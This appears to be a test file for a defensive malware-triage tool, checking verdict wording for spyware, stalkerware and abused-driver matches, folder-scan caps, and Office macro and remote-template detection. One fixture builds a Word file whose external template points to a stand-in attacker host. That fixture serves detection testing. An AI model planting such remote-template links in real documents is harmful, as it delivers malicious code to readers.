"""Findings checked before release (2026-11-14), each reproduced so it cannot come back."""
import os
import tempfile
import zipfile
from unittest.mock import patch

from zbtriage import filecheck as fc
from zbtriage.iocs import Indicator, IocSet
from zbtriage.modules import doors
from zbtriage.result import ModuleResult


def _set(*inds):
    return IocSet(list(inds), "t.txt", None)


# --no-feeds keeps the lists built into the release
def test_no_feeds_keeps_the_built_in_lists():
    from zbtriage.cli import _load_iocs, _parse
    empty = tempfile.mkdtemp()
    full = _load_iocs(_parse(["--no-menu", "--indicator-cache", empty]))
    built_in_only = _load_iocs(_parse(["--no-menu", "--indicator-cache", empty, "--no-feeds"]))
    assert len(built_in_only.indicators) == len(full.indicators)


# fingerprint tiers: an abused legitimate driver is not "known spyware"; stalkerware is named as what it is
def test_fingerprint_matches_keep_their_tier(tmp_path):
    import hashlib
    path = tmp_path / "x.sys"
    path.write_bytes(b"MZ" + b"\x00" * 300)
    digest = hashlib.sha256(path.read_bytes()).hexdigest()
    drv = fc.fc_examine(str(path), _set(Indicator(digest, "vuln-driver", "primary", "sha256", "t", "RTCore")))
    assert drv["level"] == fc.FC_LOOK and "known spyware" not in fc.fc_headline(drv)
    assert "A DRIVER ATTACKERS ABUSE" in fc.fc_render(drv)
    app = fc.fc_examine(str(path), _set(Indicator(digest, "stalkerware", "primary", "sha256", "t", "FamiSafe")))
    assert app["level"] == fc.FC_KNOWN and "stalkerware" in fc.fc_headline(app)
    spy = fc.fc_examine(str(path), _set(Indicator(digest, "sample", "primary", "sha256", "t", "Pegasus")))
    assert fc.fc_headline(spy) == "This file matches known spyware - do not open it"


def test_hash_lookup_uses_the_tier_too(tmp_path):
    import hashlib
    from zbtriage import hashlook as hl
    path = tmp_path / "x.sys"
    path.write_bytes(b"MZ" + b"\x00" * 300)
    digest = hashlib.sha256(path.read_bytes()).hexdigest()
    rec = hl.hl_examine(str(path), _set(Indicator(digest, "vuln-driver", "primary", "sha256", "t", "RTCore")),
                        lambda _p: None)
    level, words = hl.hl_verdict(rec)
    assert level == hl.HL_LOOK and "LEGITIMATE DRIVER" in words


# a driver file no registered service points at is "in the drivers folder", not "installed"
def test_an_unregistered_driver_file_is_not_called_installed():
    r = ModuleResult("doors")
    path = r"C:\Windows\System32\drivers\evil.sys"
    doors.dr_driver_doors(r, [(path, "m", "evil.sys")], 10, 0, True, True, registered=set())
    door = [d for d in r.doors if d.door == "windows:known-bad-drivers"][0]
    assert "is in Windows' drivers folder" in door.title and "only an administrator" in door.why
    r2 = ModuleResult("doors")
    doors.dr_driver_doors(r2, [(path, "m", "evil.sys")], 10, 0, True, True, registered={os.path.normcase(path)})
    assert "is installed" in [d for d in r2.doors if d.door == "windows:known-bad-drivers"][0].title


# a huge folder is never listed whole
def test_a_huge_folder_is_read_only_up_to_the_cap(tmp_path, monkeypatch):
    d = tmp_path / "Downloads"
    d.mkdir()
    for i in range(30):
        (d / "f{}.txt".format(i)).write_bytes(b"")
    monkeypatch.setattr(doors, "_DR_DL_ENTRIES", 5)
    seen_names = []
    real = os.scandir

    class Counting:
        def __init__(self, path):
            self.it = real(path)

        def __enter__(self):
            return self

        def __exit__(self, *a):
            self.it.close()

        def __iter__(self):
            for e in self.it:
                seen_names.append(e.name)
                yield e
    with patch("os.scandir", Counting):
        _f, _seen, capped, _o, _r = doors.dr_scan_downloads([(str(d), 2)])
    assert capped and len(seen_names) <= 6


# an agent named "... Client" on the list is still found
def test_a_listed_client_agent_is_found():
    assert doors.dr_match_programs(["Comodo One Client"])
    assert not doors.dr_match_programs(["RealVNC Viewer"])


# Office: an oversized list of links is not skipped silently; a renamed Office file is checked as one
def test_an_oversized_office_link_list_is_reported(tmp_path, monkeypatch):
    monkeypatch.setattr(fc, "_FC_PART_MAX", 1000)
    path = tmp_path / "invoice.docx"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/settings.xml.rels",
                   "<Relationships>" + " " * 2000 + '<Relationship Type="x/attachedTemplate" '
                   'Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    rec = fc.fc_examine(str(path))
    # a large list of links is read, not skipped: the remote template inside it is found
    assert rec["level"] == fc.FC_LOOK and any("remote template" in d for d in rec["document"])


def test_a_renamed_office_file_is_checked_as_a_document(tmp_path):
    path = tmp_path / "invoice.zip"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\x00" * 100)
    rec = fc.fc_examine(str(path))
    assert rec["kind"] == "document" and any("macros" in d for d in rec["document"])
